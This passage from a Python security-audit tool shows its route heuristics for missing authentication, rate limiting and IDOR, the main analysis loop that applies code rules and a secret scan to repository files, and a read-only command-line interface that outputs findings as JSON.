    cache: Dict[str, str] = {}
    entries = attack_surface.get("entry_points") or []
    for entry in entries:
        rel = str(entry.get("file") or "")
        line = int(entry.get("line") or 1)
        if not rel:
            continue
        text = _file_text(root, rel, cache)
        lines = text.splitlines() or [""]
        method = str(entry.get("method") or "GET").upper()
        path = str(entry.get("path") or "")
        auth = entry.get("auth") or {}
        assessment = str(auth.get("assessment") or "")
        if assessment == "no_mechanism_detected":
            risky = method != "GET" or bool(SENSITIVE_PATH_RE.search(path))
            if risky:
                findings.append(build_finding(
                    {"id": "surface-unauthenticated", "category": "missing_authentication",
                     "title": "Route appears to have no authentication",
                     "severity": "High" if method != "GET" else "Medium",
                     "confidence": "LOW", "extra_references": ()},
                    file=rel, line_start=line, line_end=line,
                    evidence=_evidence(lines, line),
                    language=str(entry.get("language") or "unknown"),
                    note=f"The attack-surface pass found no authentication mechanism for "
                         f"{method} {path}. Framework-level middleware can enforce it outside "
                         f"this file; confirm before reporting.",
                ))
        if AUTH_PRONE_PATH_RE.search(path) and not RATE_LIMIT_RE.search(text):
            findings.append(build_finding(
                {"id": "surface-no-rate-limit", "category": "missing_rate_limiting",
                 "title": "Credential endpoint without a visible rate limit",
                 "severity": "Medium", "confidence": "LOW", "extra_references": ()},
                file=rel, line_start=line, line_end=line,
                evidence=_evidence(lines, line),
                language=str(entry.get("language") or "unknown"),
                note=f"{method} {path} looks like a credential or token endpoint and no limiter "
                     f"was found in the file. Confirm at the gateway before reporting.",
            ))
        if re.search(r":[A-Za-z_]|<[^>]*:?\w+>|\{\w+\}", path) and ID_LOOKUP_RE.search(text) \
                and not OWNERSHIP_RE.search(text):
            findings.append(build_finding(
                {"id": "surface-idor", "category": "idor",
                 "title": "Object fetched by a request-supplied identifier",
                 "severity": "High", "confidence": "LOW", "extra_references": ()},
                file=rel, line_start=line, line_end=line,
                evidence=_evidence(lines, line),
                language=str(entry.get("language") or "unknown"),
                note=f"{path} takes an identifier from the URL and the file looks the record up by "
                     f"it without an ownership or tenant constraint. Confirm before reporting.",
            ))
    if not attack_surface:
        limitations.append("no attack-surface input: unauthenticated-route, IDOR and rate-limit "
                           "heuristics were skipped")
    return findings


# --------------------------------------------------------------------------- #
# Main analysis
# --------------------------------------------------------------------------- #
def _compile_rules(rules: Sequence[Dict[str, Any]]) -> List[Dict[str, Any]]:
    compiled = []
    for rule in rules:
        patterns = []
        for language, pattern in rule["patterns"]:
            try:
                patterns.append((language, re.compile(pattern, re.MULTILINE)))
            except re.error as error:                  # a bad rule must not kill the pass
                raise SystemExit(f"invalid regex in rule {rule['id']}: {error}")
        compiled.append({**rule, "compiled": patterns})
    return compiled


def analyze(root: str, inventory_doc: Optional[Dict[str, Any]] = None,
            technologies: Optional[Dict[str, Any]] = None,
            attack_surface: Optional[Dict[str, Any]] = None, *,
            only: Optional[Set[str]] = None, exclude: Optional[Set[str]] = None,
            min_severity: str = "Informational", limit_per_file: Optional[int] = None,
            max_bytes: int = 1_048_576) -> Dict[str, Any]:
    root = os.path.abspath(root)
    if inventory_doc is None:
        inventory_doc = inv.inventory(root)
    files = inventory_doc.get("files") or []
    limitations: List[str] = []
    suppressed: List[Dict[str, Any]] = []
    findings: List[Dict[str, Any]] = []
    rules = _compile_rules(RULES)
    if only:
        rules = [rule for rule in rules if rule["category"] in only]
    if exclude:
        rules = [rule for rule in rules if rule["category"] not in exclude]

    by_language: Dict[str, int] = {}
    scanned = 0
    documents_scanned = 0
    skipped_large = 0
    secrets_found: Set[str] = set()
    secret_hits = 0

    for entry in files:
        rel = entry["path"]
        bucket = entry.get("bucket")
        if bucket not in SCANNED_BUCKETS:
            continue
        # A document is read for credentials and nothing else. Prose has no
        # call graph and no sinks: running the injection rules over a tutorial
        # reports the tutorial.
        document = bucket in DOC_BUCKETS
        if entry.get("too_large"):
            skipped_large += 1
            continue
        size = int(entry.get("size") or 0)
        if size > max_bytes:
            skipped_large += 1
            continue
        try:
            with open(os.path.join(root, rel), encoding="utf-8", errors="replace") as handle:
                text = handle.read(max_bytes + 1)
        except OSError:
            limitations.append(f"file not readable: {rel}")
            continue
        if not text:
            continue
        language = entry.get("language")
        if document and not language:
            language = DOC_LANGUAGE_FALLBACK
        scanned += 1
        if document:
            documents_scanned += 1
        by_language[str(language)] = by_language.get(str(language), 0) + 1
        lines = text.splitlines()
        starts = _line_index(text)
        # Rules and the secret pass read a *code-only view*: Python docstrings are
        # blanked, string bodies and comments are kept. Docstrings are prose -- a
        # rule name written in one is a description, not a call -- while a string
        # *is* the credential and the sink a rule matches, and a comment is the
        # evidence for two rule families (a commented-out authorization check, a
        # credential pasted into a note). Offsets are preserved, so evidence and
        # line numbers still quote the real file.
        view = fm.mask_non_code(text, language, keep_strings=True,
                                blank_docstrings=True, keep_comments=True)
        signature_file = os.path.basename(rel) in SIGNATURE_FILES
        if signature_file:
            limitations.append(
                f"{rel}: detection-signature file: the code-rule and secret passes are skipped "
                f"because the pattern literals here describe the rules rather than behaviour")
        if document:
            for finding, value in _secret_pass(view, lines, starts, rel=rel,
                                               language=language, document=True):
                secrets_found.add(value)
                secret_hits += 1
                findings.append(finding)
            continue
        tainted = _tainted_names(view)
        seen_lines: Set[Tuple[str, int]] = set()
        per_rule_counts: Dict[str, int] = {}

        for rule in (() if signature_file else rules):
            applicable = [compiled for lang, compiled in rule["compiled"]
                          if _language_matches(language, bucket, lang)]
            if not applicable:
                continue
            hits = 0
            cap = limit_per_file or rule["max_per_file"]
            for pattern in applicable:
                for match in pattern.finditer(view):
                    line_no = _match_line(view, starts, match)
                    key = (rule["id"], line_no)
                    if key in seen_lines:
                        continue
                    line_text = lines[line_no - 1] if 0 < line_no <= len(lines) else ""
                    if rule["needs_source"] and not _has_source(match.group(0), line_text, tainted):
                        continue
                    guard = _guard_hit(line_text, rule)
                    if guard:
                        if len(suppressed) < 500:
                            suppressed.append({
                                "rule_id": rule["id"], "category": rule["category"],
                                "file": rel, "line": line_no,
                                "reason": f"compensating control matched: {guard}",
                                "excerpt": _evidence(lines, line_no, span=0)[:300],
                            })
                        seen_lines.add(key)
                        continue
                    if rule["context"] and not _context_hit(
                            lines, line_no, rule["context"], rule["context_lines"]):
                        seen_lines.add(key)
                        continue
                    seen_lines.add(key)
                    per_rule_counts[rule["id"]] = per_rule_counts.get(rule["id"], 0) + 1
                    if per_rule_counts[rule["id"]] > cap:
                        continue
                    hits += 1
                    findings.append(build_finding(
                        rule, file=rel, line_start=line_no, line_end=line_no,
                        evidence=_evidence(lines, line_no), language=language,
                    ))
            if per_rule_counts.get(rule["id"], 0) > cap:
                limitations.append(
                    f"{rel}: {rule['id']} matched {per_rule_counts[rule['id']]} times; only the "
                    f"first {cap} were reported")

        # ---- secrets ------------------------------------------------------- #
        # The same pass the document buckets use; see _secret_pass. A signature
        # file is skipped: the shapes it stores are the vocabulary this pass
        # matches with, so scanning it reports its own test corpus as leaks.
        if not signature_file:
            for finding, value in _secret_pass(view, lines, starts, rel=rel,
                                               language=language, document=False):
                secrets_found.add(value)
                secret_hits += 1
                findings.append(finding)

    dependency_findings, dependency_coverage = analyze_dependencies(root, files, limitations)
    findings.extend(dependency_findings)

    if attack_surface is not None:
        findings.extend(analyze_attack_surface(root, attack_surface, limitations))

    # ---- filter, sort, identify ------------------------------------------- #
    threshold = SEVERITY_RANK.get(min_severity, len(SEVERITIES))
    findings = [item for item in findings
                if SEVERITY_RANK.get(item["severity"], len(SEVERITIES)) <= threshold]
    findings.sort(key=lambda item: (SEVERITY_RANK.get(item["severity"], 9),
                                    item["location"]["file"], item["location"]["line_start"],
                                    item["category"], item["title"]))
    for index, finding in enumerate(findings, start=1):
        finding["id"] = f"VULN-{index:03d}"

    by_severity: Dict[str, int] = {}
    by_category: Dict[str, int] = {}
    by_confidence: Dict[str, int] = {}
    for finding in findings:
        by_severity[finding["severity"]] = by_severity.get(finding["severity"], 0) + 1
        by_category[finding["category"]] = by_category.get(finding["category"], 0) + 1
        by_confidence[finding["confidence"]] = by_confidence.get(finding["confidence"], 0) + 1

    if skipped_large:
        limitations.append(f"{skipped_large} file(s) were skipped for size (> {max_bytes} bytes)")
    if technologies is None:
        limitations.append("technologies.json not supplied: rules ran for every language present "
                           "rather than the detected stack")
    if not findings:
        limitations.append("no findings: the built-in rules matched nothing. This means the "
                           "patterns did not match, not that the code is proven secure; external "
                           "scanners and manual review remain part of the audit")

    return {
        "stage": "analysis",
        "schema_version": inv.SCHEMA_VERSION,
        "tool": {"name": TOOL_NAME, "version": TOOL_VERSION},
        "generated_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "root": root,
        "snapshot": {
            "commit": (inventory_doc.get("git") or {}).get("commit"),
            "branch": (inventory_doc.get("git") or {}).get("branch"),
            "dirty": (inventory_doc.get("git") or {}).get("dirty"),
            "files": (inventory_doc.get("totals") or {}).get("files"),
        },
        "summary": {
            "findings": len(findings),
            "by_severity": dict(sorted(by_severity.items(),
                                       key=lambda pair: SEVERITY_RANK.get(pair[0], 9))),
            "by_category": dict(sorted(by_category.items())),
            "by_confidence": dict(sorted(by_confidence.items())),
            "files_scanned": scanned,
            "documents_scanned": documents_scanned,
            "rules_evaluated": len(rules),
            "suppressed": len(suppressed),
            "secrets_redacted": secret_hits,
        },
        "findings": findings,
        "suppressed": suppressed,
        "coverage": {
            "files_scanned": scanned,
            "documents_scanned": documents_scanned,
            "buckets_scanned": sorted(SCANNED_BUCKETS),
            "by_language": dict(sorted(by_language.items())),
            "rules_evaluated": len(rules),
            "categories_covered": sorted({rule["category"] for rule in rules}),
            "dependency_manifests": dependency_coverage,
            "attack_surface_supplied": attack_surface is not None,
        },
        "limitations": limitations,
    }


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog=TOOL_NAME,
        description="Offline built-in analyzers for the audit (stage 3a).",
        epilog="Prints a findings JSON document on stdout (or to --out). Read-only.",
    )
    parser.add_argument("--root", default=".", help="repository root (default: .)")
    parser.add_argument("--inventory", help="reuse inventory.json from stage 1")
    parser.add_argument("--technologies", help="technologies.json from stage 2a")
    parser.add_argument("--attack-surface", help="attack-surface.json from stage 2b")
    parser.add_argument("--out", help="write JSON here instead of stdout")
    parser.add_argument("--only", help="comma-separated categories to run exclusively")
    parser.add_argument("--exclude", help="comma-separated categories to skip")
    parser.add_argument("--min-severity", default="Informational",
                        choices=list(SEVERITIES), help="drop findings below this severity")
    parser.add_argument("--limit-per-file", type=int,
                        help="cap findings per rule per file (default: the rule's own cap)")
    parser.add_argument("--max-bytes", type=int, default=1_048_576,
                        help="skip files larger than this (default 1048576)")
    parser.add_argument("--indent", type=int, default=2, help="JSON indent (default 2)")
    parser.add_argument("--list-rules", action="store_true",
                        help="print the rule inventory and exit")
    parser.add_argument("--quiet", action="store_true", help="suppress the --out summary line")
    return parser


def _load_optional(path: Optional[str], label: str) -> Optional[Dict[str, Any]]:
    if not path:
        return None
    try:
        with open(path, encoding="utf-8") as handle:
            return json.load(handle)
    except (OSError, ValueError) as error:
        raise SystemExit(f"cannot read {label} {path!r}: {error}")


def main(argv: Optional[Sequence[str]] = None) -> int:
    args = build_parser().parse_args(argv)
    if args.list_rules:
        rows = [{"id": rule["id"], "category": rule["category"], "severity": rule["severity"],
                 "confidence": rule["confidence"],
                 "languages": sorted({lang for lang, _ in rule["patterns"]})}
                for rule in RULES]
        print(json.dumps({"rules": rows, "count": len(rows)}, indent=args.indent))
        return 0
    inventory_doc = _load_optional(args.inventory, "inventory")
    technologies = _load_optional(args.technologies, "technologies")
    attack_surface = _load_optional(args.attack_surface, "attack surface")
    root = args.root
    if inventory_doc and args.root == ".":
        root = inventory_doc.get("root", ".")
    document = analyze(
        root, inventory_doc, technologies, attack_surface,
        only={item.strip() for item in args.only.split(",") if item.strip()} if args.only else None,
        exclude={item.strip() for item in args.exclude.split(",") if item.strip()}
        if args.exclude else None,
        min_severity=args.min_severity, limit_per_file=args.limit_per_file,
        max_bytes=max(1, args.max_bytes),
    )
    text = json.dumps(document, indent=args.indent, ensure_ascii=False) + "\n"
    if args.out:
        os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
        with open(args.out, "w", encoding="utf-8") as handle:
            handle.write(text)
        if not args.quiet:
            print(json.dumps({"written": args.out, **document["summary"]}))
    else:
        sys.stdout.write(text)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
